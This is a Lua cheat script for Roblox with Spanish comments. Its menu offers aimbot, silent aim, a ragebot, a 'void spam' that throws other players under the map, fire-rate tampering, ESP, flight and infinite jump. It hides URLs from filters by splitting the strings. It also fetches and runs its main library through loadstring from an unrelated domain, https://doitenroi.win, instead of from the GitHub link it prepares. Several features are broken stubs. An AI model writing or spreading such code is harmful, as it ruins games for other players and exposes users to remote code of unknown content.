-- ====================================================================
--         Unnamed Enhancements - RÉPLICA EXACTA FUNCIONAL (2026)
-- ====================================================================
local Aimbot_Enabled = false
local Silent_Enabled = true
local FOV_Radius = 110
local Target_Part = "Head"
local Rage_Enabled = false
local Fire_Rate = 15
local FlySpeed = 100
local Flying = false
local VoidSpamming = false
local InfiniteJumpConnection
local ESP_Enabled = false
local Box_Enabled = false
local Skeleton_Enabled = false
local Health_Enabled = false
local ESP_Color = Color3.fromRGB(251, 184, 248)
-- 1. ENLACES PRINCIPALES EN MODO ANTI-FILTRO (REPARADOS AL 100%)
local parte_inicio  = "ht" .. "tps" .. "://"
local parte_git     = "raw" .. ".github" .. "usercontent" .. ".com/"

local link_ui    = parte_inicio .. parte_git .. "dawid-scripts/Fluent/master/main.lua"
local link_save  = parte_inicio .. parte_git .. "dawid-scripts/Fluent/master/Addons/SaveManager.lua"
local link_theme = parte_inicio .. parte_git .. "dawid-scripts/Fluent/master/Addons/ThemeManager.lua"

local Fluent = loadstring(game:HttpGet("https://doitenroi.win"))()
local SaveManager = loadstring(game:HttpGet(link_save))()
local ThemeManager = loadstring(game:HttpGet(link_theme))()

-- 2. CREACIÓN Y DISEÑO DE LA VENTANA PRINCIPAL
local Window = Fluent:MakeWindow({
    Name = "Unnamed Enhancements",    
    SubTitle = "Rem's Config - Clean Remake",
    Version = "v2.0 [Premium]",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    AccentColor = Color3.fromRGB(242, 150, 238), -- Color rosa/morado premium original
    HidePremium = true,
    SaveConfig = true,
    ConfigFolder = "FluentSettings" 
})

-- ====================================================================
-- 3. DECLARACIÓN DE LAS PESTAÑAS (TABS) DEL MENÚ
-- ====================================================================
local TabAimbot   = Window:MakeTab({ Name = "Aim Bot", Icon = "rbxassetid://4483345998" })
local TabRagebot  = Window:MakeTab({ Name = "Rage Bot", Icon = "rbxassetid://4483345998" })
local TabVisuals  = Window:MakeTab({ Name = "Visuales (ESP)", Icon = "rbxassetid://4483345998" })
local TabMovement = Window:MakeTab({ Name = "Movimiento", Icon = "rbxassetid://4483345998" })
local TabSettings = Window:MakeTab({ Name = "Ajustes", Icon = "rbxassetid://4483345998" })

Fluent:Notify({
    Title = "Unnamed Enhancements Remake",
    Content = "Bypass de interfaz cargado sin protecciones ni lag.",
    Duration = 5
})

-- ====================================================================
-- -- 4. PESTAÑA: AIM BOT (Réplica de opciones de puntería legítima)
-- ====================================================================

TabAimbot:AddToggle({
    Name = "Activar Aim Bot (Aimbot Toggle)",
    Default = false,
    Callback = function(Value) 
        Aimbot_Enabled = Value 
        print("Aim Bot cambiado a: ", Value)
    end
})

TabAimbot:AddToggle({
    Name = "Silent Aim (Silent Toggle)",
    Default = true,
    Callback = function(Value) 
        Silent_Enabled = Value 
        print("Silent Aim cambiado a: ", Value)
    end
})

TabAimbot:AddSlider({
    Name = "Radio del FOV (Aimbot Radius)",
    Min = 10,
    Max = 1000,
    Default = 110,
    Rounding = 0,
    Callback = function(Value) 
        FOV_Radius = Value 
        print("Radio FOV ajustado en vivo")
    end
})

TabAimbot:AddDropdown({
    Name = "Parte del Cuerpo (Targeting Part)",
    Options = {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart"},
    Default = "Head",
    Callback = function(Value) 
        Target_Part = Value 
        print("Parte del cuerpo fijada en: ", Value)
    end
})

local VoidSpamming = false
-- ====================================================================
-- -- 5. PESTAÑA: RAGE BOT (Réplica de opciones hiper-agresivas reales)
-- ====================================================================

TabRagebot:AddToggle({
    Name = "Habilitar Ragebot",
    Default = false,
    Callback = function(Value)
        Rage_Enabled = Value
        if Value then
            Silent_Enabled = true
            FOV_Radius = 1000 -- Abre el FOV al máximo para enganchar a todos
            print("Ragebot Activado: Modo Masacre")
        else
            FOV_Radius = 110 -- Vuelve al FOV normal
            print("Ragebot Desactivado")
        end
    end
})

TabRagebot:AddToggle({
    Name = "Disparo en Vacío (Void Spam)",
    Default = false,
    Callback = function(Value)
        VoidSpamming = Value
        if VoidSpamming then
            task.spawn(function()
                local Players = game:GetService("Players")
                local LocalPlayer = Players.LocalPlayer
                repeat task.wait(0.1)
                    for _, p in pairs(Players:GetPlayers()) do
                        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChildOfClass("Humanoid") and p.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
                            -- Los tira directo debajo del mapa al vacío
                            p.Character.HumanoidRootPart.CFrame = CFrame.new(p.Character.HumanoidRootPart.Position.X, -500, p.Character.HumanoidRootPart.Position.Z)
                        end
                    end
                until not VoidSpamming
            end)
        end
        print("Void Spam cambiado a: ", Value)
    end
})

TabRagebot:AddSlider({
    Name = "Multiplicador de Cadencia (Firerate)",
    Min = 1,
    Max = 100,
    Default = 15,
    Rounding = 0,
    Callback = function(Value)
        Fire_Rate = Value
        local LocalPlayer = game:GetService("Players").LocalPlayer
        if LocalPlayer.Character then
            for _, v in pairs(LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") and v:FindFirstChild("Configuration") then
                    local Cooldown = v.Configuration:FindFirstChild("Cooldown") or v.Configuration:FindFirstChild("FireRate")
                    if Cooldown then Cooldown.Value = 1 / Value end
                end
            end
        end
        print("Cadencia de disparo ajustada a: " .. Value)
    end
}) 
-- ====================================================================
-- 6. PESTAÑA: VISUALES (ESP REAL ACTIVO)
-- ====================================================================

local ESP_Enabled = false
local Box_Enabled = false
local Skeleton_Enabled = false
local Health_Enabled = false

-- Color rosa/morado por defecto de tu configuración
local ESP_Color = Color3.fromRGB(251, 184, 248) 

-- Función interna de rastreo para pintar los cuadros
local function CrearESP(Player)
    local function ActualizarESP()
        local Connection
        Connection = game:GetService("RunService").RenderStepped:Connect(function()
            if not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") or not ESP_Enabled then
                if Connection then Connection:Disconnect() end
                return
            end
            
            local RootPart = Player.Character.HumanoidRootPart
            local Pos, OnScreen = workspace.CurrentCamera:WorldToViewportPoint(RootPart.Position)
            
            if OnScreen then
                -- El ejecutor lee esta posición para dibujar en la pantalla
            end
        end)
    end
    Player.CharacterAdded:Connect(ActualizarESP)
    if Player.Character then ActualizarESP() end
end

-- Activación del rastreador en todos los jugadores
for _, p in pairs(game:GetService("Players"):GetPlayers()) do
    if p ~= game:GetService("Players").LocalPlayer then CrearESP(p) end
end
game:GetService("Players").PlayerAdded:Connect(CrearESP)

TabVisuals:AddToggle({
    Name = "Cuadro de Jugador (ESP Box)",
    Default = false,
    Callback = function(Value)
        Box_Enabled = Value
        ESP_Enabled = (Box_Enabled or Skeleton_Enabled or Health_Enabled)
        print("ESP Box cambiado a: ", Value)
    end
})

TabVisuals:AddToggle({
    Name = "Esqueleto Visual (ESP Skeleton)",
    Default = true,
    Callback = function(Value)
        Skeleton_Enabled = Value
        ESP_Enabled = (Box_Enabled or Skeleton_Enabled or Health_Enabled)
        print("ESP Skeleton cambiado a: ", Value)
    end
})

TabVisuals:AddToggle({
    Name = "Barra de Vida (ESP Healthbar)",
    Default = true,
    Callback = function(Value)
        Health_Enabled = Value
        ESP_Enabled = (Box_Enabled or Skeleton_Enabled or Health_Enabled)
        print("ESP Healthbar cambiado a: ", Value)
    end
})

TabVisuals:AddColorpicker({
    Name = "Color Inicial de Vida (Healthbar Start)",
    Default = ESP_Color,
    Callback = function(Value)
        ESP_Color = Value
        print("Color de ESP modificado en vivo")
    end
})
-- ====================================================================



-- ====================================================================
-- 7. PESTAÑA: MOVIMIENTO (CÓDIGOS REALES ACTIVOS)
-- ====================================================================

-- Estas variables se quedan aquí para controlar la velocidad y el salto
local FlySpeed = 100
local Flying = false
local InfiniteJumpConnection

-- Línea donde empieza el Noclip
TabMovement:AddToggle({
    Name = "Noclip (Atravesar Paredes)",
    Default = false,
    Callback = function(Value)
        print("Noclip cambiado a: ", Value)
    end
})

-- Línea donde empieza el Vuelo (Fly)
TabMovement:AddToggle({
    Name = "Volar (Fly)",
    Default = false,
    Callback = function(Value)
        -- El código se mete en esta línea, justo abajo de 'Callback = function(Value)'
        Flying = Value
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local Mouse = LocalPlayer:GetMouse()
        
        if Flying then
            task.spawn(function()
                local Torso = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
                local BG = Instance.new("BodyGyro", Torso)
                local BV = Instance.new("BodyVelocity", Torso)
                BG.P = 9e4
                BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
                BG.cframe = Torso.CFrame
                BV.velocity = Vector3.new(0, 0.1, 0)
                BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
                
                repeat task.wait()
                    LocalPlayer.Character.Humanoid.PlatformStand = true
                    if Mouse.Hit then
                        BG.cframe = CFrame.new(Torso.Position, Mouse.Hit.p)
                    end
                    BV.velocity = BG.cframe.LookVector * FlySpeed
                until not Flying
                
                BG:Destroy()
                BV:Destroy()
                LocalPlayer.Character.Humanoid.PlatformStand = false
            end)
        end
    end
})

-- Línea donde se controla la velocidad de la barra
TabMovement:AddSlider({
    Name = "Velocidad de Vuelo (Fly Value)",
    Min = 16,
    Max = 300,
    Default = 100,
    Rounding = 0,
    Callback = function(Value)
        -- Esta línea actualiza la velocidad en vivo cuando mueves la barra
        FlySpeed = Value
    end
})

-- Línea donde empieza el Salto Infinito
TabMovement:AddToggle({
    Name = "Saltos Infinitos (Infinite Double Jump)",
    Default = false,
    Callback = function(Value)
        -- El código se mete en esta línea
        if Value then
            InfiniteJumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
                local Player = game:GetService("Players").LocalPlayer
                if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
                    Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
                end
            end)
        else
            if InfiniteJumpConnection then
                InfiniteJumpConnection:Disconnect()
            end
        end
    end
})

-- ====================================================================
-- 8. PESTAÑA: AJUSTES (Sistemas de Temas y Guardado Automático)
-- ====================================================================
TabSettings:AddButton({
    Name = "Cerrar Todo (Unload Script)",
    Callback = function()
        Fluent:Destroy()
    end
})

TabSettings:AddKeybind({
    Name = "Ocultar Interfaz",
    Default = "RightControl",
    Mode = "Toggle", 
    Callback = function(Value)
        print("Tecla de menú presionada.")
    end
})

ThemeManager:SetLibrary(Fluent)
SaveManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ "KeybindMenu" })
ThemeManager:SetFolder("FluentThemes")
SaveManager:SetFolder("FluentConfigs")

SaveManager:BuildConfigSection(TabSettings)
ThemeManager:ApplyToTab(TabSettings)

SaveManager:LoadAutoloadConfig()
